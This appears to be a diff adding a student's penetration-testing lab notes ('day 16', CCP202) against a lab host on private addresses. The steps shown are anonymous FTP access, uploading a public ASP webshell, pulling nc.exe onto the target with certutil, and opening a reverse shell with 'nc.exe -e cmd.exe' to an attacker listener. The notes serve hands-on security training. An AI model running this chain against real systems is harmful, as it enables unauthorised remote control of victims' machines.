@@ -1,0 +1,53 @@
+day 16
+CCP202
+
+(akp@kali)-[~/Desktop/CCP202]-$ nmap -sn 10.0.2.1/24
+(akp@kali)-[~/Desktop/CCP202]-$ ftp 10.0.2.24
+name: anonymous
+password: anonymous
+ftp> dir
+ftp> get index.html
+exit
+
+(akp@kali)-[~/Desktop/CCP202]-$ subl index.html
+(akp@kali)-[~/Desktop/CCP202]-$ wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp sh.asp
+(akp@kali)-[~/Desktop/CCP202]-$ mv webshell.asp sh.asp
+(akp@kali)-[~/Desktop/CCP202]-$ ftp 10.0.2.24
+name: anonymous
+password: anonymous (or) Press Enter
+ftp> dir
+ftp> put sh.asp
+ftp> dir
+
+Go to the browser 10.0.2.24/sh.asp
+browser terminal- whoami > press run
+(akp@kali)-[~/Desktop/CCP202]-$ locate nc.exe
+(akp@kali)-[~/Desktop/CCP202]-$ cp /usr/share/ .
+(akp@kali)-[~/Desktop/CCP202]-$ python3 -m http.server 80
+
+browser termianl$ certutil -urlcache -f http://10.0.2.15/nc.exe C:\Users\Public\nc.exe
+browser termianl$ dir C:\Users\Public\nc.exe
+browser termianl$ C:\Users\Public\nc.exe -e cmd.exe 10.0.2.15 443
+
+(akp@kali)-[~/Desktop/CCP202]-$ nc -lvp 443
+C:\Users\Public> whoami
+C:\Users\Public> net user
+
+
+-------------------------------------------------------------------------------xxxxxxxxxx
+Day 17
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
